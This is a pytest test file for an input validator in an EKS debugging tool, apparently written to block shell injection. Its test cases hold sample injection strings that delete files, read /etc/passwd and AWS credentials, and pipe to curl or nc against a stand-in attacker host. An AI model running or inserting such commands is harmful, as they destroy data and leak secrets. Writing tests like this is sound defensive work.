"""Tests for input validation (shell injection prevention)."""

import pytest
from eks_comprehensive_debugger import validate_input, InputValidationError


class TestValidateInput:
    """Test cases for validate_input function."""

    # === Valid Inputs ===

    @pytest.mark.parametrize(
        "value",
        [
            "prod",
            "production-profile",
            "dev.profile",
            "test_profile",
            "a",
            "Profile123",
        ],
    )
    def test_valid_profile_names(self, value: str):
        """Valid profile names should pass validation."""
        assert validate_input("profile", value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "us-east-1",
            "eu-west-1",
            "ap-southeast-2",
            "me-south-1",
            "af-south-1",
        ],
    )
    def test_valid_region_names(self, value: str):
        """Valid region names should pass validation."""
        assert validate_input("region", value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "my-cluster",
            "production.cluster",
            "cluster_name",
            "Cluster123",
            "a",
        ],
    )
    def test_valid_cluster_names(self, value: str):
        """Valid cluster names should pass validation."""
        assert validate_input("cluster_name", value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "default",
            "kube-system",
            "my-namespace",
            "ns1",
            "a",
        ],
    )
    def test_valid_namespace_names(self, value: str):
        """Valid namespace names should pass validation."""
        assert validate_input("namespace", value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "my-context",
            "context.name",
            "context_name",
            "arn:aws:eks:region:account:cluster/name",
            "user@domain",
        ],
    )
    def test_valid_kube_context_names(self, value: str):
        """Valid kube context names should pass validation."""
        assert validate_input("kube_context", value) == value

    # === Empty/None Values ===

    def test_empty_value_is_allowed(self):
        """Empty string should be allowed (optional parameters)."""
        assert validate_input("profile", "") == ""

    def test_none_value_raises_no_error(self):
        """None should be handled gracefully."""
        # The function should handle None without crashing
        result = validate_input("profile", None)
        assert result is None

    # === Shell Injection Attempts ===

    @pytest.mark.parametrize(
        "malicious_value",
        [
            "prod; rm -rf /",
            "prod && cat /etc/passwd",
            "prod | cat ~/.aws/credentials",
            "prod$(whoami)",
            "prod`id`",
            "prod > /tmp/pwned",
            "prod < /etc/passwd",
        ],
    )
    def test_shell_injection_attempts_blocked(self, malicious_value: str):
        """Shell injection attempts should be blocked."""
        with pytest.raises(InputValidationError) as exc_info:
            validate_input("profile", malicious_value)
        assert "unsafe" in str(exc_info.value).lower()

    @pytest.mark.parametrize(
        "malicious_value",
        [
            "cluster; curl attacker.com",
            "cluster && echo pwned",
            "cluster|nc attacker.com 4444",
        ],
    )
    def test_cluster_name_injection_blocked(self, malicious_value: str):
        """Shell injection in cluster name should be blocked."""
        with pytest.raises(InputValidationError):
            validate_input("cluster_name", malicious_value)

    @pytest.mark.parametrize(
        "malicious_value",
        [
            "context; id",
            "context && whoami",
        ],
    )
    def test_context_injection_blocked(self, malicious_value: str):
        """Shell injection in context should be blocked."""
        with pytest.raises(InputValidationError):
            validate_input("kube_context", malicious_value)

    # === Invalid Characters ===

    @pytest.mark.parametrize(
        "invalid_value",
        [
            "has space",
            "has/slash",
            "has\\backslash",
            "has'quote",
            'has"quote',
            "has(paren)",
            "has&ampersand",
            "has!exclaim",
            "has@at",
            "has#hash",
            "has$dollar",
            "has%percent",
            "has^caret",
            "has*asterisk",
            "has+plus",
            "has=equals",
            "has[bracket]",
            "has{brace}",
            "has|pipe",
            "has<greater",
            "has>less",
            "has?question",
        ],
    )
    def test_invalid_characters_in_profile(self, invalid_value: str):
        """Invalid characters in profile should be rejected."""
        with pytest.raises(InputValidationError):
            validate_input("profile", invalid_value)

    # === Edge Cases ===

    def test_unknown_parameter_raises_error(self):
        """Unknown parameter name should raise error."""
        with pytest.raises(InputValidationError) as exc_info:
            validate_input("unknown_param", "value")
        assert "unknown" in str(exc_info.value).lower()

    def test_region_format_strict_validation(self):
        """Region must match exact format: xx-xxxx-n."""
        with pytest.raises(InputValidationError):
            validate_input("region", "invalid-region")
        with pytest.raises(InputValidationError):
            validate_input("region", "US-EAST-1")  # uppercase

    def test_namespace_cannot_start_with_dash(self):
        """Namespace cannot start with dash."""
        with pytest.raises(InputValidationError):
            validate_input("namespace", "-invalid")

    def test_namespace_cannot_end_with_dash(self):
        """Namespace cannot end with dash."""
        with pytest.raises(InputValidationError):
            validate_input("namespace", "invalid-")

    def test_namespace_cannot_have_consecutive_dashes(self):
        """Namespace validation - check basic pattern."""
        # The regex allows consecutive dashes, so this should pass
        result = validate_input("namespace", "valid-name")
        assert result == "valid-name"
